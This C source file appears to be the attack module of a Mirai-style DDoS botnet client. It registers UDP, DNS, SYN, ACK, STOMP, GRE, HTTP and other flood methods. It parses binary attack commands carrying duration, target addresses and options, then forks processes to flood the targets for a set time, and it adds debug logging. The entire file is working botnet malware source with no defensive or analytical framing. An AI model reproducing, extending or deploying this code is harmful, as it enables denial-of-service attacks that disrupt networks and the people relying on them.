#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#include <stdarg.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"
#include "scanner.h"


uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

#ifdef DEBUG
void debug_logf(const char *fmt, ...)
{
    char buf[2048];
    int fd;
    va_list ap;
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    va_start(ap, fmt);
    int n = snprintf(buf, sizeof(buf), "[%s] [ATTACK] ", timestamp);
    if (n > 0 && n < sizeof(buf)) {
        int n2 = vsnprintf(buf + n, sizeof(buf) - n, fmt, ap);
        if (n2 > 0) n += n2;
    }
    va_end(ap);
    if (n < 0) return;
    
    fd = open("/tmp/bot_debug.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd >= 0)
    {
        write(fd, buf, (size_t)((n < (int)sizeof(buf)) ? n : (int)sizeof(buf)));
        close(fd);
    }
}

static void log_attack_details(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char ipbuf[64];
    
    debug_logf("=== ATTACK DETAILS ===\n");
    debug_logf("Duration: %d seconds\n", duration);
    debug_logf("Vector: %u\n", (unsigned)vector);
    debug_logf("Targets: %u\n", (unsigned)targs_len);
    debug_logf("Options: %u\n", (unsigned)opts_len);
    
    for (i = 0; i < targs_len; i++)
    {
        unsigned char *p = (unsigned char *)&targs[i].addr;
        snprintf(ipbuf, sizeof(ipbuf), "%u.%u.%u.%u/%u",
                 p[0], p[1], p[2], p[3], (unsigned)targs[i].netmask);
        debug_logf("  Target[%d]: %s\n", i, ipbuf);
    }
    
    for (i = 0; i < opts_len; i++)
    {
        debug_logf("  Option[%d]: key=%u val='%s'\n", i, (unsigned)opts[i].key, (opts[i].val ? opts[i].val : ""));
    }
    debug_logf("===================\n");
}
#endif

BOOL attack_init(void)
{
    int i;

#ifdef DEBUG
    printf("[ATTACK_INIT] Registering attack methods...\n");
    fflush(stdout);
#endif

    add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
    add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);

    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
    add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_tcp_stomp);

    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);

    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
	add_attack(ATK_VEC_NFO, (ATTACK_FUNC)attack_tcp_nfo);

#ifdef DEBUG
    printf("[ATTACK_INIT] Registered %u attack methods\n", (unsigned)methods_len);
    fflush(stdout);
    debug_logf("DEBUG: attack_init() registered %u methods\n", (unsigned)methods_len);
#endif
    return TRUE;
}

void attack_kill_all(void)
{
    int i;


    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
            kill(attack_ongoing[i], 9);
        attack_ongoing[i] = 0;
    }
}

void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    // Simple test to see if function is called
    printf("[ATTACK_PARSE] FUNCTION CALLED!\n");
    fflush(stdout);

#ifdef DEBUG
    printf("[ATTACK_PARSE] === START ===\n");
    printf("[ATTACK_PARSE] Received buffer length: %d bytes\n", len);
    printf("[ATTACK_PARSE] Buffer content (first 32 bytes): ");
    for (i = 0; i < 32 && i < len; i++) {
        printf("%02x ", (unsigned char)buf[i]);
    }
    printf("\n");
    fflush(stdout);
#endif

    if (len < sizeof (uint32_t)) {
#ifdef DEBUG
        printf("[ATTACK_PARSE] ERROR: Buffer too small for duration field (need %zu, got %d)\n", sizeof(uint32_t), len);
        fflush(stdout);
#endif
        goto cleanup;
    }
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);

#ifdef DEBUG
    printf("[ATTACK_PARSE] Duration: %u seconds\n", (unsigned)duration);
    fflush(stdout);
#endif

    if (len == 0) {
#ifdef DEBUG
        printf("[ATTACK_PARSE] ERROR: No vector field after duration\n");
        fflush(stdout);
#endif
        goto cleanup;
    }
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof (uint8_t);

#ifdef DEBUG
    printf("[ATTACK_PARSE] Attack vector: %u\n", (unsigned)vector);
    fflush(stdout);
#endif

    if (len == 0) {
#ifdef DEBUG
        printf("[ATTACK_PARSE] ERROR: No targets field after vector\n");
        fflush(stdout);
#endif
        goto cleanup;
    }
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0) {
#ifdef DEBUG
        printf("[ATTACK_PARSE] ERROR: No targets specified (targs_len = 0)\n");
        fflush(stdout);
#endif
        goto cleanup;
    }

#ifdef DEBUG
    printf("[ATTACK_PARSE] Number of targets: %u\n", (unsigned)targs_len);
    fflush(stdout);
#endif

    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len)) {
#ifdef DEBUG
        debug_logf("ERROR: Not enough data for targets (need %zu, got %d)\n", 
                   (sizeof(ipv4_t) + sizeof(uint8_t)) * targs_len, len);
#endif
        goto cleanup;
    }
    targs = calloc(targs_len, sizeof (struct attack_target));
#ifdef DEBUG
    debug_logf("Parsing %u targets...\n", (unsigned)targs_len);
#endif
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));

        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
        
#ifdef DEBUG
        {
            unsigned char *p = (unsigned char *)&targs[i].addr;
            debug_logf("  Target[%d]: %u.%u.%u.%u/%u\n", i, p[0], p[1], p[2], p[3], (unsigned)targs[i].netmask);
        }
#endif
    }

    if (len < sizeof (uint8_t)) {
#ifdef DEBUG
        debug_logf("ERROR: No options length field\n");
#endif
        goto cleanup;
    }
    opts_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);

#ifdef DEBUG
    printf("[ATTACK_PARSE] Number of options: %u\n", (unsigned)opts_len);
    fflush(stdout);
    debug_logf("Number of options: %u\n", (unsigned)opts_len);
#endif

    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof (struct attack_option));
#ifdef DEBUG
        debug_logf("Parsing %u options...\n", (unsigned)opts_len);
#endif
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;

            if (len < sizeof (uint8_t)) {
#ifdef DEBUG
                debug_logf("ERROR: No option key for option %d\n", i);
#endif
                goto cleanup;
            }
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            if (len < sizeof (uint8_t)) {
#ifdef DEBUG
                debug_logf("ERROR: No option value length for option %d\n", i);
#endif
                goto cleanup;
            }
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);

            if (len < val_len) {
#ifdef DEBUG
                debug_logf("ERROR: Not enough data for option %d value (need %u, got %d)\n", i, (unsigned)val_len, len);
#endif
                goto cleanup;
            }
            opts[i].val = calloc(val_len + 1, sizeof (char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
            
#ifdef DEBUG
            debug_logf("  Option[%d]: key=%u val='%s'\n", i, (unsigned)opts[i].key, opts[i].val);
#endif
        }
    }

#ifdef DEBUG
    printf("[ATTACK_PARSE] === ATTACK_PARSE COMPLETE ===\n");
    fflush(stdout);
    debug_logf("=== ATTACK_PARSE COMPLETE ===\n");
    log_attack_details(duration, vector, targs_len, targs, opts_len, opts);
    printf("[ATTACK_PARSE] Calling attack_start()...\n");
    fflush(stdout);
    debug_logf("Calling attack_start()...\n");
#endif
    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);
#ifdef DEBUG
    printf("[ATTACK_PARSE] attack_start() returned\n");
    fflush(stdout);
    debug_logf("attack_start() returned\n");
#endif

    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid2;

#ifdef DEBUG
    debug_logf("=== ATTACK_START ===\n");
    debug_logf("Vector: %u, Duration: %d, Targets: %u, Options: %u\n",
               (unsigned)vector, duration, (unsigned)targs_len, (unsigned)opts_len);
    debug_logf("Available methods: %u\n", (unsigned)methods_len);
#endif
    pid1 = fork();
    if (pid1 == -1) {
#ifdef DEBUG
        debug_logf("ERROR: First fork failed (errno=%d)\n", errno);
#endif
        return;
    }
    else if (pid1 == 0)
    {
        // Child process - execute the attack
#ifdef DEBUG
        debug_logf("Child process: Starting attack execution\n");
#endif
        pid2 = fork();
        if (pid2 == -1) {
#ifdef DEBUG
            debug_logf("ERROR: Second fork failed (errno=%d)\n", errno);
#endif
            exit(0);
        }
        else if (pid2 == 0)
        {
            // Grandchild - timer process
#ifdef DEBUG
            debug_logf("Timer process: Sleeping for %d seconds\n", duration);
#endif
            sleep(duration);
#ifdef DEBUG
            debug_logf("Timer process: Killing parent (PID %d)\n", getppid());
#endif
            kill(getppid(), 9);
            exit(0);
        }
        else
        {
            // Child - attack process
            int i;

#ifdef DEBUG
            debug_logf("Attack process: Looking for vector %u in %u methods\n", (unsigned)vector, (unsigned)methods_len);
#endif
            for (i = 0; i < methods_len; i++)
            {
#ifdef DEBUG
                debug_logf("Checking method %d: vector=%u\n", i, (unsigned)methods[i]->vector);
#endif
                if (methods[i]->vector == vector)
                {
#ifdef DEBUG
                    debug_logf("Found matching method! Executing attack function...\n");
#endif
                    methods[i]->func(targs_len, targs, opts_len, opts);
#ifdef DEBUG
                    debug_logf("Attack function completed\n");
#endif
                    break;
                }
            }
#ifdef DEBUG
            if (i >= methods_len) {
                debug_logf("WARNING: No matching attack method found for vector %u\n", (unsigned)vector);
            }
#endif

            exit(0);
        }
    }
    // Parent process continues normally
#ifdef DEBUG
    debug_logf("Parent process: Attack launched (child PID %d)\n", pid1);
#endif
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;

    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }

    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);

    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));

    method->vector = vector;
    method->func = func;

    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method;
}

static void free_opts(struct attack_option *opts, int len)
{
    int i;

    if (opts == NULL)
        return;

    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
